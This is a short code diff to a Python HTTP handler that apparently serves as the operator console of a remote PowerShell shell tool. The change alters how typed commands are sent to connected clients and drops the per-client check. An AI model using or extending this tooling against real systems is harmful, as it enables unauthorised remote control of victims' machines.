@@ -81,6 +81,8 @@ class myHandler(BaseHTTPRequestHandler):
                         self.sendCommand(command, html)
                 except UnboundLocalError:
                     pass
+                except AttributeError:
+                    pass
         else:
             input(colored("[!] New Connection from {}, please press ENTER!".format(client),'red'))
             self.sendCommand("pwd", html)
@@ -159,20 +161,14 @@ class myHandler(BaseHTTPRequestHandler):
         return iscalled
 
     def newCommand(self, pwd):
-        client = self.client_address[0]
-        global CURRENT_CLIENT
-        #print ("CURRENT CLIENT --> {}".format(CURRENT_CLIENT))
-        if client == CURRENT_CLIENT:
-            try:
-                if pwd != "":
-                    command = input(colored("PS {}> ".format(pwd), "blue")) + " ;" + PWD
-                else:
-                    command = PWD
-            except EOFError:
-                global KEY_PULSED
-                KEY_PULSED = True
-        else:
-            command = ""
+        try:
+            if pwd != "":
+                command = input(colored("PS {}> ".format(pwd), "blue")) + " ;" + PWD
+            else:
+                command = PWD
+        except EOFError:
+            global KEY_PULSED
+            KEY_PULSED = True
         return command
 
     def sendCommand(self, command, html, content=""):
